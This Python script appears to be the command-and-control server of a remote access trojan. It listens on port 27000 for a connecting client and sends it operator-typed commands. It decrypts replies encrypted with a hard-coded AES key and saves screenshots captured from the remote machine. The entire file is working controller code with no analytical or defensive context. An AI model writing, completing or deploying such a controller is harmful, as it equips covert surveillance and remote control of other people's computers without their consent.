import socket
from Crypto.Cipher import AES
import base64

def decrypt_data(encrypted_data, key="your-secret-keey"):
    """ Decrypts the data using AES encryption """
    try:
        data = base64.b64decode(encrypted_data)
        nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
        cipher = AES.new(key.encode('utf-8'), AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except Exception as e:
        return f"Decryption error: {e}".encode()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 27000))
server.listen(1)
print("Waiting for connection...")

try:
    conn, addr = server.accept()
    print(f"Connected to {addr}")
    
    while True:
        cmd = input("Command: ")
        if not cmd:
            continue
            
        conn.send(cmd.encode('utf-8'))
        
        # for binary data like screenshots, need larger buffer
        if cmd == "screenshot":
            chunks = []
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
                if len(chunk) < 4096:
                    break
            data = b''.join(chunks)
            print(f"Received {len(data)} bytes of binary data")
            
            with open("screenshot.png", "wb") as f:
                try:
                    decrypted = decrypt_data(data)
                    f.write(decrypted)
                    print("Screenshot saved as screenshot.png")
                except:
                    print("Failed to save screenshot")
        else:
            data = conn.recv(4096)
            try:
                text_data = decrypt_data(data).decode('utf-8')
                print(text_data)
            except:
                print(f"Received {len(data)} bytes of non-text data")
                
except KeyboardInterrupt:
    print("Shutting down server")
except Exception as e:
    print(f"Error: {e}")
finally:
    try:
        conn.close()
    except:
        pass
    server.close()
